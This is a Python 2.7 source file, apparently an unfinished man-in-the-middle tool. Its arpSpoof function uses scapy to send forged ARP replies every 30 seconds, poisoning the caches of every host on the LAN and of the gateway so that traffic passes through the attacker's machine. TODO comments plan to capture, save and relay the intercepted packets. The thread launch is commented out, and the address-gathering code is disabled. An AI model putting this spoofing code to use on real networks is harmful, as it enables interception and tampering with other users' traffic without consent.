#python 2.7

try:
    import wmi,logging,subprocess,re, threading,time
    from scapy.all import *
except ImportError:

    #TODO: handle all cases of missing modules and try to solve
    print 'a module is missing please check you have all required modules'

def getLocalhostAddress():
    """
    returns default gateway address,
    Subnet Mask
    and localhost IP address"""
    l=[]
    c = wmi.WMI() #create wmi object
    for interface in c.Win32_NetworkAdapterConfiguration (IPEnabled=1):
        return interface.DefaultIPGateway[0],interface.IPAddress[0],interface.MACAddress,interface.IPSubnet[0]

def getLocalAddrss(subnetMask,defaultGateway):
    """
    returns a dictionary of all LAN IP addresses and their coresponding MAC address"""


    #TODO: get all local addresses

    """allAddresses = subprocess.check_output(['arp', '-a'])
    temp=allAddresses.split('ff-ff-ff-ff-ff-ff')
    localAddrss=temp[0].split('\r\n')[3:-1]
    ipAddr=re.compile(r'\d+.\d+.\d+.\d+')
    macAddr=re.compile(r'([0-9A-Fa-f]{2}-){5}([0-9A-Fa-f]{2})')
    #created regex objects to extract IP and MAC
    localAddresses=dict()
    for i in localAddrss:
        ip=ipAddr.search(i)
        mac=macAddr.search(i)
        localAddresses[ip.group()]=mac.group().replace('-',':')#format MAC address for scapy

    #return dict of IP and MAC on LAN
    return localAddresses"""

def arpSpoof(localAddresses,defaultGateway,localMAC):
    """
    every 30 seconds send ARP broadcast to spoof all machines on LAN"""

    while True:
        for ip in localAddresses.keys():
            if ip != defaultGateway:
                #create arp packets
                victimPacket = Ether(src=localMAC,dst=localAddresses[ip])/ARP(op=2, hwsrc=localMAC,psrc = defaultGateway, pdst=ip, hwdst = localAddresses[ip])
                #victimPacket.show()
                gatewayPacket=Ether(dst=localAddresses[defaultGateway],src=localMAC)/ARP(op=2,hwsrc=localMAC,psrc=ip,hwdst=localAddresses[defaultGateway],pdst=defaultGateway)
                #gatewayPacket.show()

                #send packets
                sendp(victimPacket)
                sendp(gatewayPacket)
        time.sleep(30)



def main():
    """
    control the whole program
    gets the parameters for working
    then calls all functions in order
    """

    #setup logging to file logFile.txt
    logging.basicConfig(filename='logFile.txt',level=logging.DEBUG, format=' %(asctime)s - %(levelname)s - %(message)s')
    logging.info('\n\n\n\n\n########## Program Start ##########\n\n')

    #get default gateway and local IP address
    defaultGateway,localIP,localMAC,subnetMask=getLocalhostAddress()
    logging.debug('got default gateway, local IP, local MAC and Subnet Mask')

    #create a dictionary of local IP addresses and MAC addresses
    localAddresses=getLocalAddrss(subnetMask,defaultGateway)
    logging.debug('created dictionary with all IP and MAC addresses on LAN')

    arpThread=threading.Thread(target=arpSpoof,args=(localAddresses,defaultGateway,localMAC,))
    #arpThread.start()
    logging.debug('created thread for ARP spoofing')

    while True: #main loop

        #TODO:check if user wants to stop
        #TODO:listen for packets
        #TODO:save packet
        #TODO:send packet to router
        #TODO:listen to response from router
        #TODO:save response
        #TODO:send packet to original host
        #TODO:save packets to file
        break




if __name__=='__main__':
    main()
